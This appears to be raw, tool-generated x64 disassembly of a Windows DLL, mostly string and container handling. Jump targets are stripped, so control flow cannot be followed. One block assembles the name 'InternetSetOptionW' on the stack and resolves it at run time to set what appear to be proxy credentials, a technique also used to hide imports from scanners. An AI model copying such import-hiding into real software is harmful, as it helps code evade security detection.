lea r9 [ rsp + 0x20 ]
mov rcx r12
call sub_1800090b0
mov rbx rax
mov [ rbp - 0x21 ] 0x7
mov [ rbp - 0x29 ] r15
mov [ rbp - 0x39 ] r15w
mov r8 [ rsp + 0x20 ]
mov rdx rax
lea rcx [ rbp - 0x39 ]
call sub_180003b50
nop
mov rcx r13
call sub_18001c80c
mov rcx rbx
call sub_18001c80c
test r12 r12
je r-xdata
mov [ rbp - 0x1 ] 0x65746e49
mov [ rbp + 0x3 ] 0x74656e72
mov [ rbp + 0x7 ] 0x4f746553
mov [ rbp + 0xb ] 0x6f697470
mov [ rbp + 0xf ] 0x576e
mov [ rbp + 0x11 ] 0x0
lea rdx [ rbp - 0x1 ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov rbx rax
test rax rax
jne r-xdata
lea rcx [ rbp - 0x11 ]
call [ LoadLibraryA@IAT ]
test rax rax
jne r-xdata
lea r8 [ rbp - 0x61 ]
cmp [ rbp - 0x49 ] 0x8
cmovae r8 [ rbp - 0x61 ]
mov r9d [ rbp - 0x51 ]
inc r9d
mov edx 0x2b
mov rcx r14
call rbx
test eax eax
jne r-xdata
cmp [ rbp - 0x21 ] 0x8
jb r-xdata
cmp [ rbp - 0x21 ] 0x8
jb r-xdata
lea r8 [ rbp - 0x39 ]
cmp [ rbp - 0x21 ] 0x8
cmovae r8 [ rbp - 0x39 ]
mov r9d [ rbp - 0x29 ]
inc r9d
mov edx 0x2c
mov rcx r14
call rbx
test eax eax
jne r-xdata
cmp [ rbp - 0x21 ] 0x8
jb r-xdata
mov [ rbp - 0x21 ] 0x7
mov [ rbp - 0x29 ] r15
mov [ rbp - 0x39 ] r15w
cmp [ rbp - 0x49 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x39 ]
call j_sub_18001c80c
mov [ rbp - 0x21 ] 0x7
mov [ rbp - 0x29 ] r15
mov [ rbp - 0x39 ] r15w
cmp [ rbp - 0x49 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x39 ]
call j_sub_18001c80c
cmp [ rbp - 0x21 ] 0x8
jb r-xdata
cmp [ rbp - 0x21 ] 0x8
jb r-xdata
mov [ rbp - 0x21 ] 0x7
mov [ rbp - 0x29 ] r15
mov [ rbp - 0x39 ] r15w
cmp [ rbp - 0x49 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x39 ]
call j_sub_18001c80c
mov [ rbp - 0x49 ] 0x7
mov [ rbp - 0x51 ] r15
mov [ rbp - 0x61 ] r15w
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x61 ]
call j_sub_18001c80c
mov [ rbp - 0x49 ] 0x7
mov [ rbp - 0x51 ] r15
mov [ rbp - 0x61 ] r15w
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x61 ]
call j_sub_18001c80c
mov [ rbp - 0x21 ] 0x7
mov [ rbp - 0x29 ] r15
mov [ rbp - 0x39 ] r15w
cmp [ rbp - 0x49 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x39 ]
call j_sub_18001c80c
mov [ rbp - 0x21 ] 0x7
mov [ rbp - 0x29 ] r15
mov [ rbp - 0x39 ] r15w
cmp [ rbp - 0x49 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x39 ]
call j_sub_18001c80c
mov [ rbp - 0x49 ] 0x7
mov [ rbp - 0x51 ] r15
mov [ rbp - 0x61 ] r15w
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x61 ]
call j_sub_18001c80c
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] r15
mov [ rsi ] r15w
jmp r-xdata
mov rcx [ rsi ]
call j_sub_18001c80c
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] r15
mov [ rsi ] r15w
mov rcx [ rsi ]
call j_sub_18001c80c
mov [ rbp - 0x49 ] 0x7
mov [ rbp - 0x51 ] r15
mov [ rbp - 0x61 ] r15w
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x61 ]
call j_sub_18001c80c
mov [ rbp - 0x49 ] 0x7
mov [ rbp - 0x51 ] r15
mov [ rbp - 0x61 ] r15w
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x61 ]
call j_sub_18001c80c
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] r15
mov [ rsi ] r15w
jmp r-xdata
mov rcx [ rsi ]
call j_sub_18001c80c
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
xor al al
jmp r-xdata
mov rcx [ rdi ]
call j_sub_18001c80c
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] r15
mov [ rsi ] r15w
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rsi ]
call j_sub_18001c80c
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] r15
mov [ rsi ] r15w
jmp r-xdata
mov rcx [ rsi ]
call j_sub_18001c80c
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r15
mov [ rdi ] r15w
mov rcx [ rbp + 0x17 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0x110 ]
add rsp 0xd0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov al 0x1
mov rcx [ rdi ]
call j_sub_18001c80c
sub_180015140
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x50 ] rsi
mov rbx rdx
mov rdi rcx
mov [ rcx + 0x18 ] 0x7
xor esi esi
mov [ rcx + 0x10 ] rsi
mov [ rcx ] si
call sub_180003f60
nop
lea rcx [ rdi + 0x28 ]
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] rsi
mov [ rcx ] si
lea rdx [ rbx + 0x28 ]
call sub_180003f60
nop
mov rax rdi
mov rbx [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_1800151b0
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x68 ] rbp
mov rsi r8
mov rbp rdx
mov rbx rcx
xor r12d r12d
mov [ rsp + 0x58 ] r12d
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] r12
mov [ rcx ] r12w
mov [ rsp + 0x58 ] 0x1
xor eax eax
or rcx 0xffffffffffffffff
mov rdi r8
[ rdi ]
not rcx
dec rcx
add rcx [ rdx + 0x10 ]
mov rdi [ rbx + 0x10 ]
cmp rdi rcx
ja r-xdata
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rbp
mov rcx rbx
call sub_18000c2e0
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rsi
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx rsi
mov rcx rbx
call sub_180010e70
mov rax rbx
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
cmp [ rbx + 0x18 ] rcx
je r-xdata
mov r8b 0x1
mov rdx rcx
mov rcx rbx
call sub_180001880
test al al
je r-xdata
mov [ rbx + 0x10 ] rdi
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov [ rax + rdi * 2 ] r12w
sub_180015290
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x58 ] rbx
mov [ rsp + 0x68 ] rbp
mov rbp r8
mov rsi rdx
mov rbx rcx
xor r12d r12d
mov [ rsp + 0x60 ] r12d
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] r12
mov [ rcx ] r12w
mov [ rsp + 0x60 ] 0x1
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
dec rcx
mov rdx [ r8 + 0x10 ]
add rdx rcx
mov rdi [ rbx + 0x10 ]
cmp rdi rdx
ja r-xdata
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rsi
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx rsi
mov rcx rbx
call sub_180010e70
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rbp
mov rcx rbx
call sub_18000c2e0
mov rax rbx
mov rbx [ rsp + 0x58 ]
mov rbp [ rsp + 0x68 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
cmp [ rbx + 0x18 ] rdx
je r-xdata
mov r8b 0x1
mov rcx rbx
call sub_180001880
test al al
je r-xdata
mov [ rbx + 0x10 ] rdi
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov [ rax + rdi * 2 ] r12w
sub_180015370
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0x50
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x40 ] rax
mov rdi r8
mov rbp rdx
mov rsi rcx
mov [ rsp + 0x30 ] rcx
mov [ rsp + 0x38 ] r8
xor r12d r12d
mov [ rsp + 0x20 ] r12d
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] r12
mov [ rcx ] r12w
mov [ rsp + 0x20 ] 0x1
mov rbx [ rdx ]
cmp rbx [ rdx + 0x8 ]
je r-xdata
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
nop
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r12
mov [ rdi ] r12w
mov rax rsi
mov rcx [ rsp + 0x40 ]
xor rcx rsp
call sub_18001d1f0
add rsp 0x50
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov rcx [ rdi ]
call j_sub_18001c80c
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
mov rcx rsi
call sub_18000c2e0
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rbx
mov rcx rsi
call sub_18000c2e0
lea rdx [ rbx + 0x28 ]
or r9 0xffffffffffffffff
xor r8d r8d
mov rcx rsi
call sub_18000c2e0
add rbx 0x50
cmp rbx [ rbp + 0x8 ]
jne r-xdata
sub_180015450
push rbx
push rsi
push rdi
sub rsp 0x90
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x88 ] rax
mov rax r8
mov rbx rdx
mov rdi rcx
mov [ rsp + 0x28 ] rcx
xor esi esi
mov [ rsp + 0x20 ] esi
mov [ rsp + 0x78 ] 0x7
mov [ rsp + 0x70 ] rsi
mov [ rsp + 0x60 ] si
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
lea rcx [ rsp + 0x60 ]
call sub_180001ac0
nop
mov [ rsp + 0x50 ] 0x7
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x38 ] si
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rbx
lea rcx [ rsp + 0x38 ]
call sub_180001ac0
nop
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] rsi
mov [ rdi ] si
lea rdx [ rsp + 0x38 ]
mov rcx rdi
call sub_180003f60
nop
lea rcx [ rdi + 0x28 ]
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] rsi
mov [ rcx ] si
lea rdx [ rsp + 0x60 ]
call sub_180003f60
nop
cmp [ rsp + 0x50 ] 0x8
jb r-xdata
mov [ rsp + 0x50 ] 0x7
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x38 ] si
cmp [ rsp + 0x78 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x38 ]
call j_sub_18001c80c
mov rax rdi
mov rcx [ rsp + 0x88 ]
xor rcx rsp
call sub_18001d1f0
add rsp 0x90
pop rdi
pop rsi
pop rbx
retn
mov rcx [ rsp + 0x60 ]
call j_sub_18001c80c
sub_180015570
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x20
lea rbx [ rcx + 0x28 ]
mov rdi r8
mov rbp rdx
mov rsi rcx
cmp rbx rdx
je r-xdata
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rax rsi
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov [ rsp + 0x30 ] r12
or r12d 0xffffffff
mov rdx rdi
mov rdx [ rdi ]
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov r9 [ rbx + 0x10 ]
cmp r9 r9
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
xor r8d r8d
nop [ rax + rax ] eax
cmp r9 r10
mov r8 r10
cmovb r8 r9
test r8 r8
je r-xdata
test eax eax
je r-xdata
cmp r9 r10
jb r-xdata
cmp [ rcx ] ax
mov r8d 0x1
cmovb r8d r12d
jmp r-xdata
add rcx 0x2
add rdx 0x2
dec r8
jne r-xdata
add rbx 0x28
cmp rbx rbp
jne r-xdata
mov rcx rsi
mov rdx rbx
add rsi 0x28
call sub_180003f60
xor eax eax
cmp r9 r10
setne al
movsxd rax r8d
test r8d r8d
jne r-xdata
movzx eax [ rdx ]
cmp [ rcx ] ax
jne r-xdata
cmp [ rdi + 0x18 ] 0x8
mov r10 [ rdi + 0x10 ]
jb r-xdata
mov r12 [ rsp + 0x30 ]
sub_180015660
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx r8
mov rdi rdx
mov rsi rcx
cmp rcx rdx
je r-xdata
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
nop [ rax ] eax
sub rdi 0x28
sub rbx 0x28
or r9 0xffffffffffffffff
mov rdx rdi
mov rcx rbx
xor r8d r8d
call sub_180001ac0
cmp rdi rsi
jne r-xdata
sub_1800156c0
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x70 ] rbx
mov rsi r8
mov rdi rdx
mov rbx rcx
mov [ rsp + 0x68 ] rcx
xor r12d r12d
mov rbx [ rsp + 0x70 ]
add rsp 0x40
pop r12
pop rdi
pop rsi
retn
mov [ rsp + 0x28 ] rbx
mov [ rsp + 0x30 ] rbx
test rbx rbx
je r-xdata
dec rdi
add rbx 0x28
mov [ rsp + 0x60 ] rbx
jmp r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rsi
mov rcx rbx
call sub_180001ac0
nop
test rdi rdi
je r-xdata
sub_180015750
push rbx
push rsi
push rdi
sub rsp 0x70
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov rbx r8
mov rdi rcx
mov [ rsp + 0x30 ] rcx
xor esi esi
mov [ rsp + 0x20 ] esi
mov [ rsp + 0x50 ] 0x7
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x38 ] si
or r9 0xffffffffffffffff
xor r8d r8d
lea rcx [ rsp + 0x38 ]
call sub_180001ac0
nop
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] rsi
mov [ rdi ] si
lea rdx [ rsp + 0x38 ]
mov rcx rdi
call sub_180003f60
nop
lea rcx [ rdi + 0x28 ]
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] rsi
mov [ rcx ] si
mov rdx rbx
call sub_180003f60
nop
cmp [ rsp + 0x50 ] 0x8
jb r-xdata
mov rax rdi
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_18001d1f0
add rsp 0x70
pop rdi
pop rsi
pop rbx
retn
mov rcx [ rsp + 0x38 ]
call j_sub_18001c80c
sub_180015810
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ rdx + 0x40 ] 0x8
mov rbx rdx
jb r-xdata
xor edi edi
mov [ rbx + 0x40 ] 0x7
mov [ rbx + 0x38 ] rdi
mov [ rbx + 0x28 ] di
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rcx [ rdx + 0x28 ]
call j_sub_18001c80c
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov [ rbx ] di
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx ]
call j_sub_18001c80c
sub_180015870
cmp rcx rdx
je r-xdata
retn
push rdi
sub rsp 0x20
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rsi
mov rdi rdx
xor esi esi
lea rbx [ rcx + 0x40 ]
nop [ rax ] eax
mov [ rbx ] 0x7
mov [ rbx - 0x8 ] rsi
mov [ rbx - 0x18 ] si
cmp [ rbx - 0x28 ] 0x8
jb r-xdata
mov rcx [ rbx - 0x18 ]
call j_sub_18001c80c
mov [ rbx - 0x28 ] 0x7
mov [ rbx - 0x30 ] rsi
mov [ rbx - 0x40 ] si
add rbx 0x50
lea rax [ rbx - 0x40 ]
cmp rax rdi
jne r-xdata
mov rcx [ rbx - 0x40 ]
call j_sub_18001c80c
cmp [ rbx ] 0x8
jb r-xdata
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
sub_1800158f0
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
push rbx
push rsi
push rdi
push r12
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x60 ] rbx
xor r12d r12d
nop [ rax ] eax
mov rax rbx
add rsp 0x38
pop r12
pop rdi
pop rsi
pop rbx
retn
mov [ rsp + 0x68 ] rbx
test rbx rbx
je r-xdata
add rbx 0x50
mov [ rsp + 0x70 ] rbx
add rdi 0x50
jmp r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
mov rdx rdi
mov rcx rbx
call sub_180003f60
nop
lea rcx [ rbx + 0x28 ]
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] r12
mov [ rcx ] r12w
lea rdx [ rdi + 0x28 ]
call sub_180003f60
nop
cmp rdi rsi
je r-xdata
sub_180015990
mov [ rsp + 0x10 ] rdx
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0xa0
mov [ rsp + 0x60 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x90 ] rax
mov r11 r9
mov [ rsp + 0x58 ] r9
mov rbx r8
mov r8 rdx
mov rsi rcx
mov [ rsp + 0x38 ] rcx
mov [ rsp + 0x50 ] rbx
test rbx rbx
je r-xdata
mov rcx [ rsp + 0x90 ]
xor rcx rsp
call sub_18001d1f0
add rsp 0xa0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
mov r9 [ rcx + 0x8 ]
mov r10 [ rcx ]
mov rcx r9
sub rcx r10
mov r12 0x6666666666666667
mov rax r12
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
mov rax 0x666666666666666
sub rax rdx
cmp rax rbx
jae r-xdata
lea rdi [ rdx + rbx ]
mov rcx [ rsi + 0x10 ]
sub rcx r10
mov rax r12
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001c17c
sub r9 r8
mov rax r12
imul r9
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
mov [ rsp + 0x80 ] 0x7
xor r12d r12d
or r9 0xffffffffffffffff
xor r8d r8d
lea rcx [ rsp + 0x68 ]
mov [ rsp + 0x78 ] r12
mov [ rsp + 0x68 ] r12w
cmp rdx rbx
mov rdx r11
jae r-xdata
mov rdx rdi
mov rcx rsi
call sub_180009600
mov r15 rax
mov rdx rax
lea rcx [ rsi + 0x18 ]
call sub_1800031a0
mov rdi rax
mov [ rsp + 0x48 ] rax
mov rcx [ rsp + 0xe8 ]
sub rcx [ rsi ]
mov rax r12
imul rcx
mov r13 rdx
sar r13 0x4
mov rax r13
shr rax 0x3f
add r13 rax
mov [ rsp + 0x40 ] r13
xor r12d r12d
mov [ rsp + 0x34 ] r12d
lea rax [ r13 + r13 * 4 ]
lea rcx [ rdi + rax * 8 ]
movzx eax [ rsp + 0x30 ]
mov [ rsp + 0x28 ] al
mov [ rsp + 0x20 ] r12
lea r9 [ rsi + 0x18 ]
mov r8 [ rsp + 0x58 ]
mov rdx rbx
call sub_1800156c0
mov [ rsp + 0x34 ] 0x1
movzx eax [ rsp + 0x30 ]
mov [ rsp + 0x28 ] al
mov [ rsp + 0x20 ] r12
lea r9 [ rsi + 0x18 ]
mov r8 rdi
mov rdx [ rsp + 0xe8 ]
mov rcx [ rsi ]
call sub_180009910
mov [ rsp + 0x34 ] 0x2
lea rax [ rbx + r13 ]
lea rcx [ rax + rax * 4 ]
lea r8 [ rdi + rcx * 8 ]
movzx eax [ rsp + 0x30 ]
mov [ rsp + 0x28 ] al
mov [ rsp + 0x20 ] r12
lea r9 [ rsi + 0x18 ]
mov rdx [ rsi + 0x8 ]
mov rcx [ rsp + 0xe8 ]
call sub_180009910
nop
mov r9 [ rsi ]
mov rcx [ rsi + 0x8 ]
sub rcx r9
mov rax 0x6666666666666667
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
add rbx rdx
test r9 r9
je r-xdata
call sub_180001ac0
nop
mov rdi [ rsi + 0x8 ]
lea rax [ rbx + rbx * 4 ]
lea r12 [ rax * 8 ]
mov rbx rdi
sub rbx r12
mov r9 rdi
mov r8 rdi
mov rdx rbx
mov rcx rsi
call sub_180009990
mov [ rsi + 0x8 ] rax
mov r8 rdi
mov rdx rbx
mov rcx [ rsp + 0xe8 ]
call sub_180015660
mov rbx [ rsp + 0xe8 ]
lea rax [ r12 + rbx ]
cmp rbx rax
je r-xdata
call sub_180001ac0
nop
lea rax [ rbx + rbx * 4 ]
lea r13 [ rax * 8 ]
mov rdx [ rsp + 0xe8 ]
lea r9 [ r13 + rdx ]
mov r8 [ rsi + 0x8 ]
mov rcx rsi
call sub_180009990
nop
mov r10 [ rsi + 0x8 ]
mov rcx r10
sub rcx [ rsp + 0xe8 ]
mov rax 0x6666666666666667
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
sub rbx rdx
lea r9 [ rsi + 0x18 ]
movzx eax [ rsp + 0x30 ]
mov [ rsp + 0x28 ] al
mov [ rsp + 0x20 ] r12
lea r8 [ rsp + 0x68 ]
mov rdx rbx
mov rcx r10
call sub_1800156c0
nop
add [ rsi + 0x8 ] r13
mov rdi [ rsi + 0x8 ]
sub rdi r13
mov rbx [ rsp + 0xe8 ]
cmp rbx rdi
je r-xdata
lea rax [ r15 + r15 * 4 ]
lea rcx [ rdi + rax * 8 ]
mov [ rsi + 0x10 ] rcx
lea rax [ rbx + rbx * 4 ]
lea rcx [ rdi + rax * 8 ]
mov [ rsi + 0x8 ] rcx
mov [ rsi ] rdi
jmp r-xdata
mov r8 [ rsi + 0x8 ]
mov rdx r9
mov rcx rsi
call sub_180002620
mov rcx [ rsi ]
call j_sub_18001c80c
cmp [ rsp + 0x80 ] 0x8
jb r-xdata
nop [ rax + rax ] ax
jmp r-xdata
nop [ rax + rax ] ax
mov rcx [ rsp + 0x68 ]
call j_sub_18001c80c
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rsp + 0x68 ]
mov rcx rbx
call sub_180001ac0
add rbx 0x28
mov rax [ rsp + 0xe8 ]
lea rcx [ r12 + rax ]
cmp rbx rcx
jne r-xdata
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rsp + 0x68 ]
mov rcx rbx
call sub_180001ac0
add rbx 0x28
cmp rbx rdi
jne r-xdata
sub_180015d70
mov [ rsp + 0x8 ] rcx
push rbp
push rsi
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov rsi rcx
lea rax [ r--data ]
mov [ rcx ] rax
mov rcx [ rcx + 0xc8 ]
test rcx rcx
je r-xdata
xor ebp ebp
mov [ rsi + 0xd0 ] ebp
lea rcx [ rsi + 0xd8 ]
mov r9 [ rcx + 0x8 ]
mov r8 [ rcx ]
lea rdx [ rsp + 0x58 ]
call sub_180005930
mov r9 [ rsi + 0x100 ]
mov r8 [ rsi + 0xf8 ]
lea rdx [ rsp + 0x58 ]
lea rcx [ rsi + 0xf8 ]
call sub_180005930
mov r9 [ rsi + 0x120 ]
mov r8 [ rsi + 0x118 ]
lea rdx [ rsp + 0x58 ]
lea rcx [ rsi + 0x118 ]
call sub_180005930
nop
lea rcx [ rsi + 0x118 ]
call sub_180002680
nop
lea rcx [ rsi + 0xf8 ]
call sub_180002680
nop
lea rcx [ rsi + 0xd8 ]
call sub_180002680
nop
cmp [ rsi + 0xb0 ] 0x8
jb r-xdata
mov rax [ rcx ]
mov edx 0x1
call [ rax ]
mov [ rsi + 0xb0 ] 0x7
mov [ rsi + 0xa8 ] rbp
mov [ rsi + 0x98 ] bp
cmp [ rsi + 0x88 ] 0x8
jb r-xdata
mov rcx [ rsi + 0x98 ]
call j_sub_18001c80c
mov [ rsi + 0x88 ] 0x7
mov [ rsi + 0x80 ] rbp
mov [ rsi + 0x70 ] bp
cmp [ rsi + 0x60 ] 0x8
jb r-xdata
mov rcx [ rsi + 0x70 ]
call j_sub_18001c80c
mov [ rsi + 0x60 ] 0x7
mov [ rsi + 0x58 ] rbp
mov [ rsi + 0x48 ] bp
cmp [ rsi + 0x28 ] 0x8
jb r-xdata
mov rcx [ rsi + 0x48 ]
call j_sub_18001c80c
mov [ rsi + 0x28 ] 0x7
mov [ rsi + 0x20 ] rbp
mov [ rsi + 0x10 ] bp
lea rax [ r--data ]
mov [ rsi ] rax
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rsi + 0x10 ]
call j_sub_18001c80c
sub_180015ef0
push rbx
sub rsp 0x70
mov rbx rcx
xor ecx ecx
mov [ rsp + 0x68 ] rdi
mov [ rsp + 0x60 ] r12
mov [ rsp + 0x88 ] ecx
movzx r12d dl
cmp dl 0x1
je r-xdata
mov dil 0x1
mov rax [ rbx ]
lea rdx [ rsp + 0x20 ]
mov rcx rbx
call [ rax + 0x30 ]
mov ecx 0x1
movzx eax [ rax + 0x3 ]
cmp [ rbx + 0xc0 ] eax
je r-xdata
test dil dil
je r-xdata
lea rcx [ rsp + 0x28 ]
call sub_180002680
xor dil dil
jmp r-xdata
mov rdi [ rsp + 0x68 ]
test r12b r12b
mov r12 [ rsp + 0x60 ]
jne r-xdata
mov [ rsp + 0x80 ] rbp
mov [ rbx + 0xc0 ] 0x0
mov rcx [ rbx + 0x100 ]
sub rcx [ rbx + 0xf8 ]
mov [ rsp + 0x50 ] r15
mov r15 0x6666666666666667
mov rax r15
xor edi edi
imul rcx
mov rbp rdx
sar rbp 0x4
mov rax rbp
shr rax 0x3f
add rbp rax
je r-xdata
test cl 0x1
je r-xdata
add rsp 0x70
pop rbx
retn
inc [ rbx + 0xc0 ]
cmp r12b 0x1
je r-xdata
mov [ rsp + 0x90 ] rsi
mov [ rsp + 0x58 ] r13
xor esi esi
nop [ rax ] eax
mov [ rbx + 0x38 ] 0x0
cmp rdi rbp
je r-xdata
mov rsi [ rsp + 0x90 ]
mov r13 [ rsp + 0x58 ]
inc rdi
add rsi 0x28
cmp rdi rbp
jb r-xdata
mov rax [ rbx + 0xf8 ]
lea rcx [ r8 + r8 * 4 ]
or r9 0xffffffffffffffff
lea rdx [ rax + rcx * 8 ]
lea rcx [ rbx + 0x10 ]
xor r8d r8d
call sub_180001ac0
lea rax [ rdi + 0x1 ]
xor edx edx
div rbp
mov [ rbx + 0x38 ] rdx
jmp r-xdata
mov rax [ rbx + 0xf8 ]
lea rdx [ rbx + 0x10 ]
lea rcx [ rsi + rax ]
call sub_180014110
test eax eax
je r-xdata
mov rcx [ rbx + 0x100 ]
mov r8 [ rbx + 0x38 ]
mov rbp [ rsp + 0x80 ]
sub rcx [ rbx + 0xf8 ]
mov rax r15
mov r15 [ rsp + 0x50 ]
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jae r-xdata
sub_180016080
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_180015d70
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18001c80c
sub_1800160b0
push rbx
sub rsp 0x20
movzx eax [ rcx + 0xd0 ]
mov rbx rdx
mov [ rsp + 0x30 ] 0x0
mov [ rdx ] ax
movzx eax [ rcx + 0xd2 ]
mov [ rdx + 0x2 ] al
movzx eax [ rcx + 0xd3 ]
mov [ rdx + 0x3 ] al
lea rdx [ rcx + 0xd8 ]
lea rcx [ rbx + 0x8 ]
call sub_180002700
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180016100
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x1f0 ]
sub rsp 0x2f0
